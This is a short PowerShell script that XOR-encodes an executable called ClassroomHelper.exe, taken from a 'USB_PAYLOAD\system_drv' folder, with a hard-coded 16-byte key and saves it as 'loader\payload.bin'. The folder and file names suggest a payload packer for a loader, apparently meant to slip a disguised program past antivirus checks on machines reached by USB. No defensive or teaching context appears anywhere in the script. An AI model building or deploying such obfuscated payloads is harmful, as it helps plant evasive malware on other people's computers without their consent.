param(
    [string]$Payload = 'USB_PAYLOAD\system_drv\ClassroomHelper.exe',
    [string]$Out = 'loader\payload.bin'
)
$ErrorActionPreference = 'Stop'

$key = [byte[]]@(
    0x5A,0xC3,0x11,0x7E,0xB4,0x29,0x8D,0x46,
    0xE1,0x3B,0x67,0xFA,0x02,0x9C,0x54,0xAB
)

$bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $Payload))
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor $key[$i % 16]
}
[System.IO.File]::WriteAllBytes((Join-Path (Get-Location) $Out), $bytes)
"payload: $($bytes.Length) bytes -> $Out"
